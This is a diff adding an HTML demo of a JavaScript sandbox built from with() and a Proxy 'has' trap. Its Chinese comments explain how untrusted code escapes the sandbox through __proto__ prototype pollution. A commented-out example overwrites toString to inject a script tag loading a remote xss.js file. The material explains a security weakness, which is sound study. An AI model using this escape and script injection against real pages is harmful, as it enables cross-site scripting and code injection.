@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<script>
+    //利用with来限制作用域
+    function runCode(content) {
+        content = `with(exposeObj){${
+            content
+        }}`;
+        return new Function('exposeObj', content);//除了最后一个是函数体，前面的都是参数，这里的参数要和函数体里面的一样
+    }
+
+    //利用proxy来代理对象，对访问以外的数据进行拦截
+    function proxyObj(originObj) {
+        let exposeObj = new Proxy(originObj, {
+            has(target, p) {//其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了;
+                //但是存在致命漏洞如果是一个引用类型的数据就会出现问题，它只能监听到第一层
+                if (['console', 'Math', 'Date'].includes(p)) {
+                    return target[p];
+                }
+                if (!target.hasOwnProperty(p)) {
+                    throw new Error(`Illegal operation for key ${p}`);
+                }
+                return target[p];
+            }
+        });
+        return exposeObj;
+    }
+
+    function createSandBox(src, obj) {
+        let proxy = proxyObj(obj);//把数据对象代理
+        runCode(src).call(proxy, proxy); //绑定this 防止this访问window
+    }
+
+    let x = 12;
+    let testObj = {
+            age: 18, type: {
+                litType: 'student',
+                bigType: 'man'
+            }
+        },
+        testContent = 'age++;console.log(age);console.log(x)';
+    createSandBox(testContent, testObj);
+    //但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，
+    //这时候，它只需要通过a.b.__proto__就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。
+    //a.b.__proto__.toString = ()=>{
+    // var script = document.createElement("script");
+    // script.src = "http://.../xss.js"
+    // script.type = "text/javascript";
+    // document.body.appendChild(script)
+    //}
+    //通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码，
+    //为什么代码里可以访问document呢？因为这本身是一个函数的赋值操作，并没有执行，所以也不存在被has函数拦截了。而当你调用toString的时候，已经是在外部的代码调用了，has函数更加无从知晓。
+    //你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，
+    //但是，即使是基本类型值，数字或字符串，同样也可以通过__proto__查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：({}).__proto__.toString= ()=>{console.log(111)};
+</script>
+</body>
+</html>
